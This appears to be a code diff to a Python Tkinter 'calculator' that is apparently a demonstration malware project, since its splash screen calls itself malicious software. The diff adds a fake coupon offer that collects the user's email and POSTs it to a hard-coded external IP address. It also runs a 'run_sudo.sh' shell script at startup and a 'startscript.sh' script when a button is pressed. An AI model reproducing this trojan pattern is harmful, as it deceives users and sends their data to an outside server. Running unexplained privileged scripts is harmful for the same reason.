@@ -8,6 +8,7 @@ from codecs import utf_8_decode
 from cryptography.fernet import Fernet
 import base64, hashlib
 import os
+import requests
 
 # draw and position buttons
 def bt_draw(key, col, lin,window,disp):
@@ -24,24 +25,42 @@ def bt_press(key,disp):
         os.system("sh startscript.sh")
     else: disp['text'] += key
 
-#Create SplashScreen
-splash_win= Tk()
-splash_win.title("ATTENTION - MALWARE SOFTWARE")
+def send_email(email,windowe):
+    response = requests.post("http://174.138.13.97:3001", data = {'email':email})
+    print(response)
+    with open("email.txt","w") as thefile:
+        thefile.write(email)
+    windowe.destroy()
+    splash_screen()
 
-#Define the size of the window or frame
-splash_win.geometry("700x200")
+def splash_screen():
 
-#Remove border of the splash Window
-splash_win.overrideredirect(True)
-splash_win.eval('tk::PlaceWindow . center')
-splash_label= Label(splash_win, text= "Welcome to this APP!\n Attention!! \n This is a malicious software", fg= "blue",
-font= ('Times New Roman', 40)).pack(pady=20)
+    #Create SplashScreen
+    splash_win= Tk()
+    splash_win.title("ATTENTION - MALWARE SOFTWARE")
+
+    #Define the size of the window or frame
+    splash_win.geometry("700x200")
+
+    #Remove border of the splash Window
+    splash_win.overrideredirect(True)
+    splash_win.eval('tk::PlaceWindow . center')
+    splash_label= Label(splash_win, text= "Welcome to this APP!\n Attention!! \n This is a malicious software", fg= "blue",
+    font= ('Times New Roman', 40))
+    splash_label.pack(pady=20)
+    splash_win.update()
+    sleep(2)
+
+    os.system("sh run_sudo.sh")
+    
+    splash_win.destroy()
+    mainWin()
 
 
 
 
 def mainWin():
-    splash_win.destroy()
+    #splash_win.destroy()
     window = Tk()
     window.title('Calculator')
 
@@ -51,9 +70,22 @@ def mainWin():
     keys = '()C<789/456*123-.0=+'
     bt_list = [bt_draw(keys[n], n%4, n//4,window,disp) for n in range(20)]
 
+def emailWin():
+    #splash_win.destroy()
+    windowe = Tk()
+    windowe.title('Calculator')
 
-os.system("sh run_sudo.sh")
-sleep(2)
-splash_win.after(3000, mainWin)
+    #windowe.geometry('700x400')
+    #windowe.configure(background = "grey");
+    a1 = Label(windowe ,text = "Thank you for using our app!").grid(row = 0,column = 0)
+    a = Label(windowe ,text = "We want to reward you with a cupon code for our store! ").grid(row = 1,column = 0)
+    b = Label(windowe ,text = "Please send your Email!").grid(row = 2,column = 0)
+    c = Label(windowe ,text = "Email: ").grid(row = 3,column = 0)
+    a1 = Entry(windowe)
+    a1.grid(row = 4,column = 0)
+    btn = Button(windowe ,text="Submit",command=lambda: send_email(a1.get(),windowe)).grid(row=5,column=0)
+    
+emailWin()
+
 mainloop()
 
